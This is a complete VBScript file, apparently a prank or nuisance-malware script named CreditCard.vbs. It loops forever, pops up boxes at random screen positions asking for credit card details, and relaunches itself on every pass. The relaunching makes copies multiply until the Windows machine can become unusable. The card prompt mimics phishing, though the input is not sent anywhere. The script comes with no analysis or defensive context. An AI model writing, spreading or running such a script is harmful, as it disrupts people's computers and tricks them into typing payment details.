dim minx, maxx, randx
dim miny, maxy, randy
minx = 1
maxx = 23000
miny = 1
maxy = 13000

do until true = false

randomize
randx = Int((maxx-minx+1)*Rnd+minx)
randomize
randy = Int((maxy-miny+1)*Rnd+miny)

         a = InputBox("Enter your credit card details here:","CreditCard",,randx,randy)
CreateObject("WScript.Shell").Run "CreditCard.vbs"


loop